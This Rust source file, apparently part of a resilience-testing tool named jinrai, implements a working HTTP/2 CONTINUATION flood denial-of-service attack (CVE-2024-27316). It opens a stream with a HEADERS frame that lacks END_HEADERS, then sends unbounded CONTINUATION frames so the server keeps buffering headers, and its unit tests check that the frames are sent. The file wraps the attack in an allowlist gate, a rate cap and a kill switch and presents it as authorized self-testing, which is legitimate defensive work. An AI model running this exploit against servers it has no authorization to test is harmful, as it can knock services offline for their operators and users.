//! # HTTP/2 CONTINUATION flood (CVE-2024-27316) — isolated-lab / authorized use.
//!
//! Opens a single HTTP/2 stream with a HEADERS frame that **withholds the
//! `END_HEADERS` flag**, then streams `CONTINUATION` frames that *also* never set
//! `END_HEADERS`. A server must buffer the concatenated header-block fragments
//! until the block is complete — which, here, it never is. Because
//! `CONTINUATION` frames are **not flow-controlled** (only `DATA` is), the client
//! forces unbounded server-side header buffering at almost no cost to itself —
//! the resource asymmetry that makes this a denial-of-service class. jinrai
//! exposes it as a resilience self-test so an operator can measure whether their
//! own stack (server, proxy, CDN) is patched / bounds its header accumulation.
//!
//! ## Why raw frames (not the `h2` crate)
//!
//! Unlike [`crate::rapid_reset`], this primitive cannot use the high-level `h2`
//! client: that crate only ever emits *complete*, valid HEADERS blocks and closes
//! them with `END_HEADERS`. Withholding `END_HEADERS` and dribbling raw
//! `CONTINUATION` frames is precisely the frame-level control it abstracts away.
//! So — exactly as [`jinrai_l34`] crafts packets by hand, std-only — we write the
//! HTTP/2 connection preface and frames directly onto the byte stream. No new
//! dependency, no new TLS/HTTP stack.
//!
//! ## Same safety boundary as the other L7 engines
//!
//! The URL host is authorized as a **datum** ([`crate::authorize_datum`]) and
//! resolved **once** to a pinned connect address ([`crate::resolve_addrs`]); the
//! HTTP/2 connection only ever goes there. `https` negotiates HTTP/2 via ALPN
//! (accept-any-cert, see [`crate::tls`]); `http` uses prior-knowledge h2c. The
//! run is bounded by `duration`, capped by the rate cap (reinterpreted as
//! *CONTINUATION frames per second*), and aborts promptly on the kill switch.
//! There is no spoofing and no reflection/amplification: it is a direct self-test.

use std::net::SocketAddr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use http::Uri;
use tokio::io::{AsyncRead, AsyncWrite, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::MissedTickBehavior;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::TlsConnector;

use jinrai_core::{Layer, ModuleError, RunPlan, RunReport, StressModule};
use jinrai_safety::{Authorization, AuthorizedTarget, KillSwitch};

use crate::h2_frames::{
    push_frame, FLAG_NONE, PREFACE, TYPE_CONTINUATION, TYPE_HEADERS, TYPE_SETTINGS,
};
use crate::{authorize_datum, resolve_addrs, wait_for_kill, L7Error};

/// Per-`CONTINUATION` payload size. `SETTINGS_MAX_FRAME_SIZE` has a hard RFC floor
/// of 16384, so a 16 KiB fragment is always within the frame-size limit — no
/// server can advertise a smaller ceiling and reject it as `FRAME_SIZE_ERROR`.
const FRAGMENT_LEN: usize = 16_384;

/// The HTTP/2 CONTINUATION-flood engine. Holds a clone of the gate (the sole
/// authority) and the target URL.
#[derive(Debug, Clone)]
pub struct H2ContinuationEngine {
    gate: Authorization,
    url: String,
}

impl H2ContinuationEngine {
    pub fn new(gate: Authorization, url: impl Into<String>) -> Self {
        Self { gate, url: url.into() }
    }

    /// Authorize the datum (public so the CLI can fail-closed before any run).
    pub fn authorize_target(&self) -> Result<Vec<AuthorizedTarget>, L7Error> {
        Ok(vec![authorize_datum(&self.gate, &self.url)?.target])
    }

    fn prepare(&self) -> Result<Prepared, L7Error> {
        let datum = authorize_datum(&self.gate, &self.url)?;
        let addr = resolve_addrs(&datum)?.primary();
        let uri = datum
            .url
            .as_str()
            .parse::<Uri>()
            .map_err(|e| L7Error::InvalidUrl(e.to_string()))?;
        // https => TLS with ALPN "h2"; http => prior-knowledge h2c (no TLS).
        let tls = if datum.url.scheme() == "https" {
            let connector = TlsConnector::from(crate::tls::client_config(vec![b"h2".to_vec()])?);
            Some((connector, crate::tls::server_name(&datum)?))
        } else {
            None
        };
        Ok(Prepared { addr, uri, tls })
    }

    /// This primitive could not start. See [`crate::module_error`] for why the
    /// distinction between a refusal and a setup failure is kept.
    fn refusal(&self, e: L7Error) -> ModuleError {
        crate::module_error("L7 h2-continuation".to_string(), e)
    }
}

struct Prepared {
    addr: SocketAddr,
    uri: Uri,
    tls: Option<(TlsConnector, ServerName<'static>)>,
}

impl StressModule for H2ContinuationEngine {
    fn layer(&self) -> Layer {
        Layer::L7
    }

    fn name(&self) -> &str {
        "l7-h2-continuation"
    }

    fn execute(&mut self, plan: &RunPlan) -> Result<RunReport, ModuleError> {
        let Prepared { addr, uri, tls } = match self.prepare() {
            Ok(p) => p,
            Err(e) => return Err(self.refusal(e)),
        };

        // Rate cap: min spacing between CONTINUATION frames. `None` => send nothing.
        let Some(interval) = plan.rate_cap.min_interval() else {
            return Ok(RunReport {
                layer_label: format!("L7 h2-continuation {} (rate cap 0 — sent nothing)", self.url),
                aborted_early: false,
                ..Default::default()
            });
        };

        let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
            Ok(rt) => rt,
            Err(e) => return Err(self.refusal(L7Error::Client(e.to_string()))),
        };

        let sent = Arc::new(AtomicU64::new(0));
        let errors = Arc::new(AtomicU64::new(0));
        let sent_w = sent.clone();
        let errors_w = errors.clone();
        let kill = plan.kill.clone();
        let duration = plan.duration;

        rt.block_on(async move {
            let deadline = crate::deadline_in(duration);
            let tcp = match tokio::time::timeout(Duration::from_secs(10), TcpStream::connect(addr)).await {
                Ok(Ok(s)) => s,
                _ => {
                    errors_w.fetch_add(1, Ordering::Relaxed);
                    return;
                }
            };

            match tls {
                None => drive(tcp, uri, interval, deadline, kill, sent_w, errors_w).await,
                Some((connector, server_name)) => {
                    let handshake =
                        tokio::time::timeout(Duration::from_secs(10), connector.connect(server_name, tcp));
                    let stream = match handshake.await {
                        Ok(Ok(s)) => s,
                        _ => {
                            errors_w.fetch_add(1, Ordering::Relaxed);
                            return;
                        }
                    };
                    // The server must have agreed to HTTP/2 over ALPN, else there
                    // is no h2 framing for the CONTINUATION flood to speak.
                    if stream.get_ref().1.alpn_protocol() != Some(b"h2") {
                        errors_w.fetch_add(1, Ordering::Relaxed);
                        return;
                    }
                    drive(stream, uri, interval, deadline, kill, sent_w, errors_w).await;
                }
            }
        });

        let aborted = plan.kill.is_tripped();
        let n = sent.load(Ordering::Relaxed);
        Ok(RunReport {
            layer_label: format!(
                "L7 h2-continuation {} ({} CONTINUATION frame{})",
                self.url,
                n,
                if n == 1 { "" } else { "s" }
            ),
            units_sent: n,
            errors: errors.load(Ordering::Relaxed),
            aborted_early: aborted,
            ..Default::default()
        })
    }
}

/// Open the connection at the frame level and dribble `CONTINUATION` frames that
/// never carry `END_HEADERS`, rate-capped, until the deadline or kill. Generic
/// over the byte stream so the same loop serves h2c (`TcpStream`) and h2-over-TLS
/// (`TlsStream`). The header-block fragments are opaque filler: because the block
/// is never terminated, the server buffers them and never decodes them, so their
/// HPACK content is irrelevant — the point is that they accumulate.
async fn drive<IO>(
    mut io: IO,
    _uri: Uri,
    interval: Duration,
    deadline: Instant,
    kill: KillSwitch,
    sent: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
) where
    IO: AsyncRead + AsyncWrite + Unpin + Send + 'static,
{
    // Connection preface + an empty SETTINGS frame, then a HEADERS frame that
    // opens stream 1 WITHOUT END_HEADERS — the block is deliberately unfinished,
    // committing the server to await CONTINUATION frames. A tiny fragment is
    // enough to open it.
    let mut open = Vec::with_capacity(PREFACE.len() + 9 + 9 + 16);
    open.extend_from_slice(PREFACE);
    push_frame(&mut open, TYPE_SETTINGS, FLAG_NONE, 0, &[]);
    push_frame(&mut open, TYPE_HEADERS, FLAG_NONE, 1, &[0u8; 8]);
    if io.write_all(&open).await.is_err() {
        errors.fetch_add(1, Ordering::Relaxed);
        return;
    }

    // Reusable CONTINUATION frame (type 0x9, no END_HEADERS) on stream 1.
    let mut frame = Vec::with_capacity(9 + FRAGMENT_LEN);
    push_frame(&mut frame, TYPE_CONTINUATION, FLAG_NONE, 1, &[0u8; FRAGMENT_LEN]);

    let mut ticker = tokio::time::interval(interval);
    // Never exceed the cap: on a missed tick, delay rather than burst.
    ticker.set_missed_tick_behavior(MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = ticker.tick() => {}
            _ = wait_for_kill(kill.clone()) => break,
        }
        if kill.is_tripped() || Instant::now() >= deadline {
            break;
        }

        // A write failure means the peer tore the connection down (e.g. it bounds
        // header accumulation and reset the stream) or stopped reading — record
        // and stop. A server that stalls instead of closing is the mitigation this
        // primitive probes for, so the write cannot be allowed to outlast the run.
        match crate::write_or_stop(&mut io, &frame, &kill, deadline).await {
            crate::FrameWrite::Wrote => {
                sent.fetch_add(1, Ordering::Relaxed);
            }
            crate::FrameWrite::Failed => {
                errors.fetch_add(1, Ordering::Relaxed);
                break;
            }
            crate::FrameWrite::Stopped => break,
        }
    }

    let _ = io.shutdown().await;
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Read;
    use std::net::TcpListener;
    use std::sync::atomic::AtomicBool;
    use std::sync::Mutex;
    use std::thread;

    use jinrai_core::RateCap;
    use jinrai_safety::{Allowlist, KillSwitch};

    fn gate_cidrs(cidrs: &[&str]) -> Authorization {
        Authorization::new(Allowlist::from_cidrs(cidrs).unwrap(), KillSwitch::new())
    }

    #[test]
    fn authorizes_http_and_https_datums() {
        // Both schemes authorize as data; TLS/ALPN is a connect-time concern.
        for url in ["http://127.0.0.1:9/", "https://127.0.0.1:9/"] {
            let engine = H2ContinuationEngine::new(gate_cidrs(&["127.0.0.0/8"]), url);
            assert!(engine.authorize_target().is_ok(), "{url} should authorize");
        }
    }

    #[test]
    fn unauthorized_target_refused() {
        // 127.0.0.1 is not inside 10.0.0.0/8 => fail-closed.
        let engine = H2ContinuationEngine::new(gate_cidrs(&["10.0.0.0/8"]), "http://127.0.0.1:9/");
        assert!(engine.authorize_target().is_err());
    }

    #[test]
    fn name_and_layer() {
        let engine = H2ContinuationEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/");
        assert_eq!(engine.name(), "l7-h2-continuation");
        assert_eq!(engine.layer(), Layer::L7);
    }

    #[test]
    fn rate_cap_zero_sends_nothing() {
        let engine = H2ContinuationEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/");
        let mut engine = engine;
        let plan = RunPlan {
            targets: engine.authorize_target().unwrap(),
            rate_cap: RateCap::new(0),
            duration: Duration::from_millis(50),
            kill: KillSwitch::new(),
        };
        let report = engine.execute(&plan).expect("the run should execute");
        assert_eq!(report.units_sent, 0);
        assert!(!report.aborted_early);
        assert!(report.layer_label.contains("sent nothing"));
    }

    /// A throwaway raw-TCP server that accepts one connection, reads whatever the
    /// client writes, and records the bytes so the test can assert the HTTP/2
    /// preface and at least one CONTINUATION (type 0x9) frame arrived. It never
    /// speaks h2c back — the flood is write-only, so the client keeps sending.
    #[allow(clippy::type_complexity)]
    fn spawn_raw_server() -> (u16, Arc<Mutex<Vec<u8>>>, Arc<AtomicBool>, thread::JoinHandle<()>) {
        let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = listener.local_addr().unwrap().port();
        listener.set_nonblocking(true).unwrap();
        let seen = Arc::new(Mutex::new(Vec::<u8>::new()));
        let stop = Arc::new(AtomicBool::new(false));
        let seen_s = seen.clone();
        let stop_s = stop.clone();
        let handle = thread::spawn(move || {
            while !stop_s.load(Ordering::Relaxed) {
                match listener.accept() {
                    Ok((mut s, _)) => {
                        s.set_read_timeout(Some(Duration::from_millis(100))).unwrap();
                        let mut buf = [0u8; 65536];
                        while !stop_s.load(Ordering::Relaxed) {
                            match s.read(&mut buf) {
                                Ok(0) => break,
                                Ok(n) => seen_s.lock().unwrap().extend_from_slice(&buf[..n]),
                                Err(ref e)
                                    if e.kind() == std::io::ErrorKind::WouldBlock
                                        || e.kind() == std::io::ErrorKind::TimedOut => {}
                                Err(_) => break,
                            }
                        }
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
        });
        (port, seen, stop, handle)
    }

    #[test]
    fn sends_preface_then_continuation_frames() {
        let (port, seen, stop, handle) = spawn_raw_server();
        let url = format!("http://127.0.0.1:{port}/");
        let mut engine = H2ContinuationEngine::new(gate_cidrs(&["127.0.0.0/8"]), &url);
        let plan = RunPlan {
            targets: engine.authorize_target().unwrap(),
            rate_cap: RateCap::new(200),
            duration: Duration::from_millis(400),
            kill: KillSwitch::new(),
        };
        let report = engine.execute(&plan).expect("the run should execute");
        // Give the server thread a beat to drain the socket, then stop it.
        thread::sleep(Duration::from_millis(100));
        stop.store(true, Ordering::Relaxed);
        handle.join().unwrap();

        assert!(report.units_sent > 0, "should have sent CONTINUATION frames");
        let bytes: Vec<u8> = { seen.lock().unwrap().clone() };
        assert!(bytes.starts_with(PREFACE), "connection must open with the h2 preface");
        // Scan the frame stream for a CONTINUATION (type byte 0x9 at a frame header).
        assert!(has_continuation_frame(&bytes), "server should have seen a CONTINUATION frame");
    }

    /// Walk the frame stream (9-byte header + payload) and report whether any
    /// frame is a CONTINUATION (type 0x9). Skips the fixed preface first.
    fn has_continuation_frame(bytes: &[u8]) -> bool {
        let Some(mut rest) = bytes.strip_prefix(PREFACE) else { return false };
        while rest.len() >= 9 {
            let len = ((rest[0] as usize) << 16) | ((rest[1] as usize) << 8) | rest[2] as usize;
            let ty = rest[3];
            if ty == TYPE_CONTINUATION {
                return true;
            }
            let frame_end = 9 + len;
            if rest.len() < frame_end {
                break;
            }
            rest = &rest[frame_end..];
        }
        false
    }
}
